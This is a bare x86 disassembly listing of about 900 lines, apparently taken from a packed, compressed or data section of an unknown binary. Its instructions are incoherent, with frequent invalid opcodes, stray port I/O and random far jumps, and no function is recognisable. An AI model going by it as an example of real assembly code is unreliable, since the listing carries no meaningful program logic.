  41290e:	push   0xee6fcecb
  412913:	nop
  412914:	div    BYTE PTR [ebx]
  412916:	dec    edi
  412917:	fsubr  DWORD PTR [ebx-0x46]
  41291a:	outs   dx,DWORD PTR ds:[esi]
  41291b:	aaa    
  41291c:	pop    edx
  41291d:	mov    edx,0x46c669e7
  412922:	dec    ebp
  412923:	sbb    DWORD PTR [edi-0xb53721a],edx
  412929:	stos   DWORD PTR es:[edi],eax
  41292a:	jns    0x41294e
  41292c:	das    
  41292d:	popf   
  41292e:	add    dl,BYTE PTR [ecx-0x37]
  412931:	(bad)  
  412932:	mov    ebx,0x6b54de22
  412937:	jmp    0x24c0:0xc098ce17
  41293e:	add    esp,DWORD PTR [ebp+0x3e]
  412941:	mov    ebp,0xd999aef4
  412946:	in     al,dx
  412947:	inc    DWORD PTR [eax]
  412949:	inc    esp
  41294a:	pop    eax
  41294b:	test   eax,0x7e228f0c
  412950:	and    DWORD PTR [ebx+0x5f],edi
  412953:	in     al,0xcb
  412955:	inc    ecx
  412956:	nop
  412957:	mov    ds:0xd50c0960,al
  41295c:	add    DWORD PTR ds:0xf548b5a7,0xffffffb6
  412963:	and    DWORD PTR [di],edx
  412966:	cmp    cl,BYTE PTR [ebx-0x3292fc45]
  41296c:	cmp    al,0x76
  41296f:	daa    
  412970:	pop    edi
  412971:	mov    eax,edi
  412973:	(bad)  
  412974:	(bad)  
  412976:	(bad)  
  412979:	and    al,0xc1
  41297b:	cs nop
  41297d:	shl    dh,cl
  41297f:	push   esp
  412980:	mov    esi,0x73d3a218
  412985:	jmp    0xe7736753
  41298a:	out    0xa,al
  41298c:	mov    bh,0x25
  41298e:	lods   eax,DWORD PTR ds:[esi]
  41298f:	int    0xa2
  412991:	arpl   WORD PTR [ebp+0x37],di
  412994:	scas   al,BYTE PTR es:[edi]
  412995:	add    al,0x1f
  412997:	cli    
  412998:	aas    
  412999:	call   0xc896:0x4aacce21
  4129a0:	scas   eax,DWORD PTR es:[edi]
  4129a1:	add    ebp,DWORD PTR [edi+0x78c420a7]
  4129a7:	icebp  
  4129a8:	sub    DWORD PTR [edi+0x3c],eax
  4129ab:	jecxz  0x412989
  4129ad:	stos   BYTE PTR es:[edi],al
  4129ae:	stos   BYTE PTR es:[edi],al
  4129af:	repz inc ebp
  4129b1:	mov    ebp,0xf7ceaed5
  4129b6:	mov    DWORD PTR [eax],edi
  4129b8:	fistp  QWORD PTR [eax]
  4129ba:	mov    esi,0x91629623
  4129bf:	test   eax,0xa7e3f769
  4129c4:	pop    edx
  4129c5:	push   ecx
  4129c6:	xchg   ebx,eax
  4129c7:	mov    edx,0x6b7e546e
  4129cc:	adc    al,0x80
  4129ce:	fwait
  4129cf:	xchg   ebx,eax
  4129d0:	pop    ds
  4129d1:	mov    al,0x11
  4129d3:	sete   BYTE PTR [edx]
  4129d6:	jae    0x412993
  4129d8:	leave  
  4129d9:	(bad)  [eax-0x5]
  4129dc:	sbb    BYTE PTR [edx],0x9d
  4129df:	push   ebx
  4129e0:	cs stos DWORD PTR es:[edi],eax
  4129e2:	lea    esp,[eax]
  4129e4:	sti    
  4129e5:	sbb    DWORD PTR [ebx+0x6f5c2c53],esi
  4129eb:	stc    
  4129ec:	call   0xac100519
  4129f1:	xchg   BYTE PTR [ecx],bh
  4129f3:	mov    ?,WORD PTR [eax+0x4f]
  4129f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	js     0x412a07
  4129fa:	mov    bh,0x8
  4129fc:	jne    0x412a1d
  4129fe:	add    al,0x8f
  412a00:	imul   esp,DWORD PTR [edx],0xc6dfec1f
  412a06:	adc    BYTE PTR ds:0x38bdae4c,cl
  412a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a0d:	shr    esi,cl
  412a0f:	xor    BYTE PTR [ebx+0x1bf0681a],0x70
  412a16:	cs mov eax,0x59ad8d1e
  412a1c:	add    eax,0x428d8ebd
  412a21:	cmp    al,0x2d
  412a23:	loop   0x412a60
  412a25:	lock lds esp,FWORD PTR [eax]
  412a28:	pop    esp
  412a29:	jmp    0x69fd6509
  412a2e:	cmp    dh,BYTE PTR [ecx-0x36]
  412a31:	push   edi
  412a32:	xchg   esp,eax
  412a33:	pop    ebp
  412a34:	jb     0x412ab5
  412a36:	pushf  
  412a37:	inc    edi
  412a38:	stos   DWORD PTR es:[edi],eax
  412a39:	lock mov al,ds:0xc6ec92c
  412a3f:	test   eax,0xefac16de
  412a44:	imul   BYTE PTR [esi-0x553566dd]
  412a4a:	cdq    
  412a4b:	enter  0x9d20,0xd
  412a4f:	pop    ebx
  412a50:	call   0x9850367c
  412a55:	bound  ebp,QWORD PTR [ebx+0x7c]
  412a58:	pop    ss
  412a59:	mov    ecx,0x3efac6f7
  412a5e:	and    DWORD PTR ds:0xd30e9f05,0x92614541
  412a68:	in     al,dx
  412a69:	push   esi
  412a6a:	aam    0x3b
  412a6c:	mov    ebp,0x82b7c138
  412a71:	xchg   ebx,eax
  412a72:	aas    
  412a73:	pop    edx
  412a74:	scas   eax,DWORD PTR es:[edi]
  412a75:	sahf   
  412a76:	fiadd  WORD PTR [ecx]
  412a78:	xchg   esp,eax
  412a79:	pusha  
  412a7a:	sub    DWORD PTR [ebx+0x326c7aa6],edi
  412a80:	and    esi,ebx
  412a82:	fld    DWORD PTR [ecx-0x76ba8313]
  412a88:	mov    bl,ch
  412a8a:	test   DWORD PTR [ebp+0x11],edx
  412a8d:	sub    eax,0x3c045653
  412a92:	(bad)  
  412a93:	in     al,0x6e
  412a95:	fadd   QWORD PTR [ecx+0x56411d6f]
  412a9b:	sub    DWORD PTR [eax],esi
  412a9d:	sub    al,0xd1
  412a9f:	and    cl,BYTE PTR [edi]
  412aa1:	mov    esi,0x3eb8f64c
  412aa6:	jno    0x412af6
  412aa8:	int    0xa8
  412aaa:	mov    ds:0x66c4f176,al
  412aaf:	js     0x412a49
  412ab1:	dec    edi
  412ab2:	shr    BYTE PTR [edx-0x7c],0x29
  412ab6:	cmc    
  412ab7:	pop    eax
  412ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab9:	push   ebp
  412aba:	pop    ecx
  412abb:	call   0xc683:0x7634917c
  412ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ac3:	enter  0x8b42,0xa9
  412ac7:	pop    edx
  412ac8:	(bad)  
  412ac9:	repnz inc ebx
  412acb:	sbb    al,0x81
  412acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ace:	ins    DWORD PTR es:[edi],dx
  412acf:	and    ebp,DWORD PTR [esp+eiz*4+0x2f048bf]
  412ad6:	xchg   edx,eax
  412ad7:	into   
  412ad8:	push   0xb165b0ef
  412add:	inc    ecx
  412ade:	sub    al,0x3
  412ae0:	int    0x34
  412ae2:	mov    dh,0x27
  412ae4:	xchg   BYTE PTR [edi+0x6],dl
  412ae7:	xchg   ebx,eax
  412ae8:	ss dec edi
  412aea:	mov    al,0x42
  412aec:	mov    eax,0x416d255f
  412af1:	rol    DWORD PTR [eax+ecx*4],0x2c
  412af5:	mov    esp,0x1dd46255
  412afa:	test   eax,0x3f1c5
  412aff:	jge    0x412aa6
  412b01:	adc    BYTE PTR [edx],0x2e
  412b04:	pusha  
  412b05:	adc    ch,BYTE PTR [ecx-0x3ed79efc]
  412b0b:	inc    esp
  412b0c:	test   eax,0x843fc0e3
  412b11:	add    BYTE PTR [ebp-0x58756c0a],ch
  412b17:	call   0x4317:0x6b31717d
  412b1e:	ror    DWORD PTR [esi],cl
  412b20:	cmp    BYTE PTR [edx-0x70],ch
  412b23:	fwait
  412b24:	pusha  
  412b25:	sbb    bl,BYTE PTR [edx-0x71725796]
  412b2b:	int    0xcf
  412b2d:	or     DWORD PTR [ecx+0x75],esp
  412b30:	push   cs
  412b31:	mov    edi,ecx
  412b33:	mov    dh,0x2f
  412b35:	push   ds
  412b36:	int    0xf1
  412b38:	cmp    eax,DWORD PTR [edi-0x1aadc7aa]
  412b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b3f:	mov    bl,0xb3
  412b41:	fcmovnb st,st(4)
  412b43:	and    eax,0x83ab7e3b
  412b48:	xchg   esi,edi
  412b4a:	sahf   
  412b4b:	mov    ds:0xa4212727,eax
  412b50:	xchg   BYTE PTR [eax+0x57c18166],ah
  412b56:	fadd   QWORD PTR [ebx-0x1d3ab91d]
  412b5c:	mov    ebp,0x8f9c3eab
  412b61:	and    DWORD PTR [edx+eax*2-0x40],eax
  412b65:	or     ecx,ebx
  412b67:	mov    eax,0xd3542f46
  412b6c:	mov    dl,0x9
  412b6e:	push   esi
  412b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b70:	dec    esp
  412b71:	xor    BYTE PTR [eax],0xb
  412b74:	and    esp,DWORD PTR [ecx+edx*1]
  412b77:	ss push edx
  412b79:	sbb    al,0xf1
  412b7b:	adc    ecx,DWORD PTR [ebx]
  412b7d:	jne    0x412b3f
  412b7f:	hlt    
  412b80:	mov    ecx,0xb94415cf
  412b85:	in     eax,dx
  412b86:	call   0x56b66734
  412b8b:	dec    ebp
  412b8c:	idiv   BYTE PTR [eax+0x72c161d0]
  412b92:	fsubr  DWORD PTR [esi-0x75aa077c]
  412b98:	sbb    ecx,DWORD PTR [ebx+ecx*2]
  412b9b:	ss inc ecx
  412b9d:	out    0xfb,eax
  412b9f:	retf   0xb0f3
  412ba2:	addr16 popa 
  412ba4:	out    dx,al
  412ba5:	in     eax,0xf4
  412ba7:	jp     0x412b44
  412ba9:	sub    al,BYTE PTR [eax*1+0x4b8777f4]
  412bb0:	xor    al,0xe7
  412bb2:	push   0xffffffa1
  412bb4:	(bad)  
  412bb5:	ja     0x412baa
  412bb7:	add    BYTE PTR [esp+ebp*2+0x18a804d4],ch
  412bbe:	retf   
  412bbf:	xchg   ebp,eax
  412bc0:	mov    WORD PTR [edi+eax*2],es
  412bc3:	sti    
  412bc4:	outs   dx,DWORD PTR ds:[esi]
  412bc5:	sub    DWORD PTR [eax+0x2a25d6eb],ebx
  412bcb:	in     al,dx
  412bcc:	repz icebp 
  412bce:	fist   WORD PTR [edi-0x65]
  412bd1:	fadd   QWORD PTR [esi-0x2d]
  412bd4:	push   esp
  412bd6:	pop    edx
  412bd8:	xchg   esi,eax
  412bd9:	pop    esi
  412bda:	call   0x9606ce89
  412bdf:	mov    dl,BYTE PTR ds:0x36636771
  412be5:	aad    0x43
  412be7:	pop    edi
  412be8:	test   eax,0x47dd851
  412bed:	sub    DWORD PTR [eax+0x23],0x57d1d5d
  412bf4:	lds    esi,FWORD PTR [esi]
  412bf6:	jle    0x412c66
  412bf8:	(bad)  
  412bf9:	fsubr  QWORD PTR [edx]
  412bfb:	xchg   ebp,eax
  412bfc:	(bad)  
  412bfe:	xor    BYTE PTR [esi],ah
  412c00:	icebp  
  412c01:	sti    
  412c02:	aam    0x77
  412c04:	loop   0x412c03
  412c06:	mov    ebx,0x773eaa5d
  412c0b:	call   0x6727555e
  412c10:	and    cl,BYTE PTR [eax]
  412c12:	jecxz  0x412bfc
  412c14:	je     0x412c74
  412c16:	(bad)  
  412c17:	sti    
  412c18:	push   es
  412c19:	add    BYTE PTR [ecx-0x78b91da2],0x77
  412c20:	data16 add al,BYTE PTR [edx+ebx*8+0x4a263903]
  412c28:	clc    
  412c29:	mov    edx,0xf4686d61
  412c2e:	mov    ecx,0x87d3e2ca
  412c33:	xor    ch,BYTE PTR ds:[ebx+0x71]
  412c37:	ds stos DWORD PTR es:[edi],eax
  412c39:	fld    DWORD PTR [edi+eax*4-0x4f]
  412c3d:	and    DWORD PTR [eax-0x14],ebp
  412c40:	mov    ch,0xc4
  412c42:	ja     0x412c49
  412c44:	or     eax,0x272a45b8
  412c49:	clc    
  412c4a:	cdq    
  412c4b:	sub    al,BYTE PTR [edi+0x52851fe]
  412c51:	repz xor al,0x16
  412c54:	fadd   st(0),st
  412c56:	call   0x487cf5d5
  412c5b:	sbb    eax,0x840ddab4
  412c60:	cmp    esp,DWORD PTR [esi-0x21fb8ef5]
  412c66:	and    edi,DWORD PTR [esi]
  412c68:	fild   DWORD PTR [ecx]
  412c6a:	nop
  412c6b:	icebp  
  412c6c:	cdq    
  412c6d:	or     al,0xb2
  412c6f:	cwde   
  412c70:	int3   
  412c71:	in     eax,0xe9
  412c73:	push   eax
  412c74:	aas    
  412c75:	pop    esi
  412c76:	fcom   st(2)
  412c78:	shr    DWORD PTR gs:[ebx+0x18a1a7f7],0xb
  412c80:	mov    edi,esi
  412c82:	(bad)  
  412c83:	(bad)  
  412c84:	mov    ds:0x48142706,eax
  412c89:	pop    ecx
  412c8a:	push   edi
  412c8b:	rol    BYTE PTR [ebp-0x6e],0xe6
  412c8f:	push   ds
  412c90:	cmp    esp,DWORD PTR [edi+ebx*1+0x2d4db11]
  412c97:	sub    edi,DWORD PTR [edx+0x22]
  412c9a:	fmul   st,st(7)
  412c9c:	test   al,0x15
  412c9e:	mov    edx,0x97f282ff
  412ca3:	adc    eax,0x8116de8a
  412ca8:	mov    fs,ecx
  412caa:	mov    dh,0xb5
  412cac:	aas    
  412cad:	push   ds
  412cae:	stos   BYTE PTR es:[edi],al
  412caf:	or     al,0x99
  412cb1:	push   esp
  412cb2:	inc    edi
  412cb3:	dec    ecx
  412cb4:	outs   dx,BYTE PTR ds:[esi]
  412cb5:	retf   
  412cb6:	es push edx
  412cb8:	(bad)  
  412cb9:	pop    ebx
  412cba:	jmp    FWORD PTR [esi]
  412cbc:	dec    ecx
  412cbd:	cdq    
  412cbe:	xlat   BYTE PTR ds:[ebx]
  412cbf:	out    dx,al
  412cc0:	fsub   QWORD PTR [ebp+0x22]
  412cc3:	jne    0x412d11
  412cc5:	jbe    0x412caa
  412cc7:	adc    al,0x4e
  412cc9:	jno    0x412c4f
  412ccb:	shl    BYTE PTR [eax+0x31],0xc3
  412ccf:	jnp    0x412d2a
  412cd1:	ja     0x412cfe
  412cd3:	jmp    0x412c75
  412cd5:	xor    eax,0xc519202d
  412cda:	sbb    bl,bl
  412cdc:	loope  0x412d01
  412cde:	push   ecx
  412cdf:	and    al,0x87
  412ce1:	cwde   
  412ce2:	in     al,dx
  412ce3:	inc    ecx
  412ce4:	rol    DWORD PTR [ebp+0x84496dd],cl
  412cea:	(bad)  
  412ceb:	ds mov eax,0xaa2891e5
  412cf1:	inc    esi
  412cf2:	mov    al,ds:0xd697602b
  412cf7:	jne    0x412c80
  412cf9:	cmp    DWORD PTR [edx],edx
  412cfb:	adc    BYTE PTR ds:0x39e1fe2d,0x2c
  412d02:	sub    al,0xe9
  412d04:	sbb    DWORD PTR [esp+edx*8+0x54391e4e],eax
  412d0b:	inc    esi
  412d0c:	repnz sub bh,al
  412d0f:	xchg   esp,eax
  412d10:	xor    eax,0x933abf7b
  412d15:	mov    DWORD PTR [esi],esi
  412d17:	in     al,dx
  412d18:	dec    DWORD PTR [esi-0x7f]
  412d1b:	cmc    
  412d1c:	mov    ss,WORD PTR [edx+0x5c09ddb0]
  412d22:	mov    edi,0xfa1ef123
  412d27:	or     eax,0xb544bd09
  412d2c:	adc    bh,BYTE PTR [edi-0x71]
  412d2f:	nop
  412d30:	inc    ecx
  412d31:	sub    ebp,DWORD PTR [esi]
  412d33:	imul   ecx,edi,0x92e84c94
  412d39:	mov    ah,0x86
  412d3b:	iret   
  412d3c:	mov    BYTE PTR [edx+0x10f54d92],ah
  412d42:	inc    esi
  412d43:	iret   
  412d44:	push   ss
  412d45:	and    BYTE PTR [ebx],ah
  412d47:	xlat   BYTE PTR ds:[ebx]
  412d48:	ja     0x412dc8
  412d4a:	pop    edi
  412d4b:	pop    esi
  412d4c:	pop    edi
  412d4d:	push   es
  412d4e:	inc    eax
  412d4f:	mov    BYTE PTR [ecx-0x70],ah
  412d52:	add    DWORD PTR [ecx+0x79],ecx
  412d55:	pop    ds
  412d56:	imul   edx,DWORD PTR ds:0x41c9f71f,0x9ce40678
  412d60:	arpl   ax,sp
  412d62:	push   edi
  412d63:	mov    ds:0x8bcd8085,al
  412d68:	out    0x53,al
  412d6a:	sahf   
  412d6b:	sub    eax,0xe4ba8a40
  412d70:	xor    dh,BYTE PTR ds:0xaae6ce80
  412d76:	xor    al,al
  412d78:	or     ebx,ecx
  412d7a:	shl    BYTE PTR [ecx-0x7d672276],cl
  412d80:	cmp    ebx,DWORD PTR [edi+0x37]
  412d83:	mov    BYTE PTR [edx+0x79],ah
  412d86:	dec    esp
  412d87:	jp     0x412dd1
  412d89:	pop    ebx
  412d8a:	les    ecx,FWORD PTR [edi+0xed742f2]
  412d90:	jp     0x412d39
  412d92:	in     eax,0xa7
  412d94:	popf   
  412d95:	cmp    ch,ch
  412d97:	sub    DWORD PTR [ebx+0x20],ebx
  412d9a:	aam    0x24
  412d9c:	mov    al,0xf9
  412d9e:	jl     0x412def
  412da0:	imul   edi,esi,0xe
  412da3:	xor    ebx,DWORD PTR [esi]
  412da5:	cwde   
  412da6:	pop    ss
  412da7:	push   0x4184b4ff
  412dac:	dec    ebp
  412dad:	sahf   
  412dae:	xchg   BYTE PTR [ebp-0x80],al
  412db1:	jnp    0x412d38
  412db3:	mov    edx,0x88a5571
  412db8:	mov    edi,0xbc2ead20
  412dbd:	or     ebx,DWORD PTR [eax-0x4c]
  412dc0:	adc    ch,BYTE PTR [edx]
  412dc2:	inc    ecx
  412dc3:	stc    
  412dc4:	das    
  412dc5:	into   
  412dc6:	mov    ebx,0xabe2d64
  412dcb:	into   
  412dcc:	push   0x3f2325da
  412dd1:	cmc    
  412dd2:	pop    ecx
  412dd3:	jmp    0x412dba
  412dd5:	shl    BYTE PTR [ebx+0x4f],1
  412dd8:	jmp    0x16f616bf
  412ddd:	pop    ebp
  412dde:	test   DWORD PTR [ebp+0x1c],ebp
  412de1:	push   ds
  412de2:	xchg   ebx,eax
  412de3:	inc    esi
  412de4:	jne    0x412e31
  412de6:	add    bh,BYTE PTR [edx-0x65e7037]
  412dec:	adc    BYTE PTR [ecx-0x36],ch
  412def:	jae    0x412e21
  412df1:	es adc al,0xe4
  412df4:	add    ebx,DWORD PTR [ebp+0x4ae39d16]
  412dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dfb:	cdq    
  412dfc:	pop    ecx
  412dfd:	xor    ecx,eax
  412dff:	mul    DWORD PTR [ecx+0xb]
  412e02:	shr    BYTE PTR [esi-0x5a],1
  412e05:	push   es
  412e06:	pop    ss
  412e07:	or     BYTE PTR [edx],0x33
  412e0a:	shr    DWORD PTR [edi+0x52],0x8e
  412e0e:	lds    esi,FWORD PTR [esi-0x56]
  412e11:	xchg   ebx,eax
  412e12:	jbe    0x412e48
  412e14:	push   ebx
  412e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e16:	push   ecx
  412e17:	int3   
  412e18:	pusha  
  412e19:	mov    ebx,0xf6ab2daa
  412e1e:	jl     0x412e88
  412e20:	cmc    
  412e21:	cmc    
  412e22:	(bad)  
  412e23:	in     al,0xf5
  412e25:	add    ch,BYTE PTR [ecx+0x55]
  412e28:	cmp    ah,ch
  412e2a:	cmp    eax,0xf38448dd
  412e2f:	and    ah,ah
  412e31:	xchg   ebp,eax
  412e32:	call   0x2577:0x2b78277c
  412e39:	mov    BYTE PTR [eax],ah
  412e3b:	cmp    edx,DWORD PTR [ebx]
  412e3d:	stc    
  412e3e:	mov    edi,0x9a5959ab
  412e43:	mov    esi,0xc99eb122
  412e48:	or     al,0xd1
  412e4a:	inc    esp
  412e4b:	ficom  WORD PTR [ebp+0x1d223e81]
  412e51:	loopne 0x412e2d
  412e53:	scas   eax,DWORD PTR es:[edi]
  412e54:	test   dl,ch
  412e56:	rcl    ecx,1
  412e58:	repz push eax
  412e5a:	sahf   
  412e5b:	call   0x951:0x787eb6ba
  412e62:	ss repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412e66:	xchg   ebx,eax
  412e67:	push   ecx
  412e68:	cmp    bl,dh
  412e6a:	sbb    BYTE PTR ds:0xd78f1256,0x4e
  412e71:	pushf  
  412e72:	jmp    0x412e0f
  412e74:	dec    ecx
  412e75:	mov    WORD PTR [edi+0x4b4e3583],ds
  412e7b:	es mov dl,0xa4
  412e7e:	ins    DWORD PTR es:[edi],dx
  412e7f:	and    al,0x34
  412e81:	out    dx,al
  412e82:	jl     0x412e7b
  412e84:	sbb    BYTE PTR [ecx+0x17],bh
  412e87:	fcmovnb st,st(1)
  412e89:	jne    0x412e2e
  412e8b:	cmp    BYTE PTR [ebx-0x3a1839ee],0x3b
  412e92:	ins    BYTE PTR es:[edi],dx
  412e93:	nop
  412e94:	or     BYTE PTR [ebx-0x35b04c57],0x6b
  412e9b:	xchg   dl,bh
  412e9d:	imul   ebx,DWORD PTR [eax-0x6a],0x2b49f314
  412ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea5:	in     eax,0x67
  412ea7:	pusha  
  412ea8:	mov    ah,0x9c
  412eaa:	clc    
  412eab:	pushf  
  412eac:	addr16 (bad) 
  412eae:	dec    DWORD PTR [ebx+0x242191ed]
  412eb4:	xlat   BYTE PTR ds:[ebx]
  412eb5:	leave  
  412eb6:	pop    ebx
  412eb7:	add    DWORD PTR [edi+ebx*1],ecx
  412eba:	lahf   
  412ebb:	outs   dx,DWORD PTR ds:[esi]
  412ebc:	mov    al,ds:0xe4e438ec
  412ec1:	loop   0x412ecc
  412ec3:	test   al,0xc6
  412ec5:	mov    edx,0xe410cca
  412eca:	cmp    BYTE PTR [ebx+ecx*8],0x30
  412ece:	jmp    0x8d56:0x6b2b63f6
  412ed5:	cmp    BYTE PTR [edi+0x55],0xb
  412ed9:	shl    BYTE PTR [edi+eiz*1-0x7fd2b66f],cl
  412ee0:	or     dh,BYTE PTR [edx+0x7a]
  412ee3:	and    esi,DWORD PTR [ebx]
  412ee5:	mov    esi,DWORD PTR [eax]
  412ee7:	ret    
  412ee8:	dec    ebp
  412ee9:	int3   
  412eea:	push   ss
  412eeb:	jmp    0x412e78
  412eed:	aaa    
  412eee:	xlat   BYTE PTR ds:[ebx]
  412eef:	leave  
  412ef0:	gs xor edi,edx
  412ef3:	test   al,0xa9
  412ef5:	push   0xc3240453
  412efa:	aad    0x29
  412efc:	into   
  412efd:	add    al,0x35
  412eff:	ss test al,0x86
  412f02:	pop    ds
  412f03:	dec    ecx
  412f04:	dec    esi
  412f05:	mov    ds:0x41961ef1,eax
  412f0a:	lods   al,BYTE PTR ds:[esi]
  412f0b:	sbb    BYTE PTR [edx+0x2c834ae1],al
  412f11:	rcl    BYTE PTR [edx],0x1
  412f14:	adc    al,0x4b
  412f16:	test   BYTE PTR [edi+0x48],al
  412f19:	inc    esp
  412f1a:	xor    BYTE PTR [esi],cl
  412f1c:	loopne 0x412f72
  412f1e:	aad    0xc
  412f20:	mov    esi,0xac9b9683
  412f25:	adc    edx,edi
  412f27:	(bad)  
  412f28:	jge    0x412f87
  412f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f2b:	sbb    eax,0x3fd88e48
  412f30:	ja     0x412f21
  412f32:	jmp    DWORD PTR [edi]
  412f34:	xor    BYTE PTR [esi-0x57],al
  412f37:	outs   dx,DWORD PTR ds:[esi]
  412f38:	push   edi
  412f39:	xor    DWORD PTR [eax],edx
  412f3b:	ins    DWORD PTR es:[edi],dx
  412f3c:	fld    QWORD PTR [esi]
  412f3e:	xchg   DWORD PTR [ebx+0x6b],esp
  412f41:	ret    
  412f42:	nop
  412f43:	jno    0x412fa4
  412f45:	into   
  412f46:	adc    BYTE PTR ds:0xff879d66,cl
  412f4c:	mov    ch,BYTE PTR [ecx]
  412f4e:	xor    DWORD PTR [edx+edx*4+0x2510e61b],edi
  412f55:	ds push es
  412f57:	jae    0x412f43
  412f59:	daa    
  412f5a:	jbe    0x412f25
  412f5c:	and    eax,0xe9a168c7
  412f61:	ret    
  412f62:	push   ecx
  412f63:	adc    BYTE PTR [edx],0x43
  412f66:	jmp    0xd25a:0x569b2b2d
  412f6d:	push   ds
  412f6e:	push   eax
  412f6f:	das    
  412f70:	outs   dx,BYTE PTR ds:[esi]
  412f71:	rcr    DWORD PTR [edx],1
  412f73:	test   al,0xec
  412f75:	jnp    0x412f0c
  412f77:	mov    dl,bh
  412f79:	arpl   WORD PTR [edi],dx
  412f7b:	mov    bh,0x93
  412f7d:	push   ebx
  412f7e:	test   al,0xe4
  412f80:	or     al,0x9c
  412f82:	dec    eax
  412f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f84:	jmp    0x412f2a
  412f86:	aad    0x3b
  412f88:	sbb    eax,0xde642a1c
  412f8d:	loope  0x412f58
  412f8f:	sbb    BYTE PTR [edx+edx*2-0x7e3168d5],cl
  412f96:	cdq    
  412f97:	mov    cl,0xfd
  412f99:	aad    0x1c
  412f9b:	pop    eax
  412f9c:	cdq    
  412f9d:	jmp    0x412f65
  412f9f:	cmp    BYTE PTR ds:0x7531c619,0x57
  412fa6:	out    0x50,al
  412fa8:	les    ecx,FWORD PTR [edi+eax*8-0x79369629]
  412faf:	adc    DWORD PTR [edx+0x39b92859],edi
  412fb5:	enter  0x23d9,0x4
  412fb9:	inc    ebx
  412fba:	pusha  
  412fbb:	inc    ebx
  412fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbd:	ret    0x8a28
  412fc0:	imul   eax,DWORD PTR [esi-0x50233b49],0x74826abb
  412fca:	mov    ebp,0x79fccb17
  412fcf:	loope  0x41302b
  412fd1:	in     eax,0x9f
  412fd3:	jecxz  0x413013
  412fd5:	jg     0x413017
  412fd7:	and    eax,0xf3e4da71
  412fdc:	into   
  412fdd:	pop    es
  412fde:	and    al,0xf3
  412fe0:	xor    BYTE PTR [esi-0x18],0xcb
  412fe4:	test   BYTE PTR [edx+ecx*4-0x4dc80c1b],0x14
  412fec:	mov    esp,0x3dfdc785
  412ff1:	dec    esi
  412ff2:	lock bound ebp,QWORD PTR [edi-0x79e42010]
  412ff9:	lea    edx,[ebx]
  412ffb:	scas   eax,DWORD PTR es:[edi]
  412ffc:	or     dl,BYTE PTR [ebp-0x52]
  412fff:	les    esp,FWORD PTR [edi-0x1b2dd07f]
  413005:	aam    0xaf
  413007:	mov    edx,0x1991a01c
  41300c:	es mov edx,0x3b952e33
  413012:	int3   
  413013:	stc    
  413014:	ins    DWORD PTR es:[edi],dx
  413015:	retf   0x2826
  413018:	clc    
  413019:	lahf   
  41301a:	cmp    eax,0x22739fbe
  41301f:	dec    ecx
  413020:	xor    ah,ch
  413022:	sbb    DWORD PTR [esi+0x75],esp
  413025:	cmp    BYTE PTR [ebx+eax*1+0x26],0xb7
  41302a:	dec    ebx
  41302b:	push   ds
  41302c:	dec    edi
  41302d:	jns    0x413069
  41302f:	test   al,0x2a
  413031:	adc    esi,eax
  413033:	pop    ds
  413034:	mov    ah,0xd9
  413036:	cmp    eax,0x8349d167
  41303b:	xlat   BYTE PTR ds:[ebx]
  41303c:	mov    ebp,DWORD PTR [ecx+0x7a09cf1a]
  413042:	dec    ecx
  413043:	retf   
  413044:	pop    DWORD PTR [ecx+0x20]
  413047:	out    dx,al
  413048:	jp     0x41304a
  41304a:	mov    ebp,0xcd22ed9d
  41304f:	inc    ecx
  413050:	rol    DWORD PTR [edx+0x15],0x6
  413054:	into   
  413055:	outs   dx,DWORD PTR ds:[esi]
  413056:	call   0xbe43:0xe52d9b47
  41305d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41305e:	retf   0xc5a8
  413061:	sar    bh,cl
  413063:	pop    ecx
  413064:	scas   eax,DWORD PTR es:[edi]
  413065:	imul   ebp,edi,0xffffffe4
  413068:	nop
  413069:	iret   
  41306a:	push   esi
  41306b:	sbb    BYTE PTR [esp+ebp*4],dl
  41306e:	inc    ecx
  41306f:	sbb    al,0x1d
  413071:	mov    DWORD PTR [bx+0x65bc],esi
  413076:	dec    esi
  413077:	mov    cl,0x5a
  413079:	shl    ebp,0x7f
  41307c:	ins    DWORD PTR es:[edi],dx
  41307d:	jge    0x4130ca
  41307f:	pop    edi
  413080:	retf   0xec2d
  413083:	push   eax
  413084:	dec    eax
  413085:	shr    DWORD PTR [ebx-0x130ec911],cl
  41308b:	mov    bh,0x3d
  41308d:	inc    ebp
  41308e:	xor    al,bl
  413090:	jp     0x41306d
  413092:	cmc    
  413093:	sbb    esi,edi
  413095:	outs   dx,BYTE PTR ss:[esi]
  413097:	(bad)  
  413098:	out    dx,al
  413099:	enter  0x3f72,0x95
  41309d:	push   cs
  41309e:	dec    eax
  41309f:	and    al,0xb1
  4130a1:	idiv   esp
  4130a3:	adc    ebp,DWORD PTR [ebx]
  4130a5:	es push es
  4130a7:	retf   0x5c1a
  4130aa:	sub    al,0xf0
  4130ac:	xor    BYTE PTR [ebp-0x6c],al
  4130af:	pop    edx
  4130b0:	mov    esp,0x3ec13b5d
  4130b5:	fild   QWORD PTR [esi+eiz*1]
  4130b8:	shl    bl,0x7d
  4130bb:	adc    ebx,DWORD PTR [edi+0x5685223b]
  4130c1:	xchg   ebx,eax
  4130c2:	jp     0x413061
  4130c4:	data16 test BYTE PTR [eax],al
  4130c7:	shl    DWORD PTR [ebp+0x17],1
  4130ca:	mov    ebx,0xfd6b565a
  4130cf:	sub    dl,bh
  4130d1:	sbb    edx,esp
  4130d3:	shl    BYTE PTR [eax],1
  4130d5:	mov    al,ds:0xe707c9a6
  4130da:	mov    edi,0xaeaa2319
  4130df:	adc    al,BYTE PTR [edx]
  4130e1:	test   ebp,ebp
